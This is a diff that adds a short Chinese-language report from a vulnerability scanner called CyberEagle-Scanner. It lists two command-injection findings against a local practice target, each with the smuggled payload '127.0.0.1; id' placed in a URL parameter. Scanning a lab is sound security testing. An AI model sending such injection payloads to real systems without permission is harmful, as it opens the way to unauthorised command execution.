@@ -1,0 +1,18 @@
+============================================================
+CyberEagle-Scanner 扫描报告
+扫描时间: 2026-09-05 02:50:35
+目标 URL: http://127.0.0.1/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit
+发现漏洞总数: 2
+============================================================
+
+[CMD] 共发现 2 个漏洞
+  1. 命令回显被检测到
+     参数: ip
+     Payload: 127.0.0.1; id
+     URL: http://127.0.0.1/vulnerabilities/exec/?ip=127.0.0.1%3B+id&Submit=Submit
+
+  2. 命令回显被检测到
+     参数: Submit
+     Payload: 127.0.0.1; id
+     URL: http://127.0.0.1/vulnerabilities/exec/?ip=127.0.0.1&Submit=127.0.0.1%3B+id
+
